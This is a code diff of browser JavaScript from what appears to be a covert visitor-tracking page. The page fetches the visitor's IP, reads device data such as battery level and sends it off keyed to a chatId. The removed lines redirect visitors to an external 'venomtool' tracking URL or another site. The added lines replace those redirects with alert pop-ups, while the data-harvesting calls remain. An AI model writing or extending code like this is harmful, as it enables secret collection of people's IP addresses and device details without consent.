@@ -76,8 +76,8 @@
 
                 await sendDeviceData(td, batteryLevel, ip);
             } catch (error) {
-                console.error('Battery status retrieval failed:', error);
-                window.location.href = "https://linuxgen.in";
+                alert('Battery status retrieval failed: ' + error.message);
+                // No redirection after alert
             }
         }
 
@@ -97,13 +97,16 @@
                 });
 
                 if (response.ok) {
-                    window.location.href = `https://venomtool.in/t/?id=${chatId}`;
+                    alert('Data sent successfully');
+                    // No redirection after success
                 } else {
-                    window.location.href = `https://venomtool.in/t/?id=${chatId}`;
+                    const errorText = await response.text();
+                    alert('Failed to send data: ' + errorText);
+                    // No redirection after failure
                 }
             } catch (error) {
-                
-                window.location.href = "https://linuxgen.in";
+                alert('Error while sending data: ' + error.message);
+                // No redirection after error
             }
         }
 
@@ -113,8 +116,8 @@
                 const data = await response.json();
                 await gatherDeviceData(data.ip);
             } catch (error) {
-                console.error('IP retrieval failed:', error);
-                window.location.href = "https://linuxgen.in";
+                alert('IP retrieval failed: ' + error.message);
+                // No redirection after error
             }
         }
 
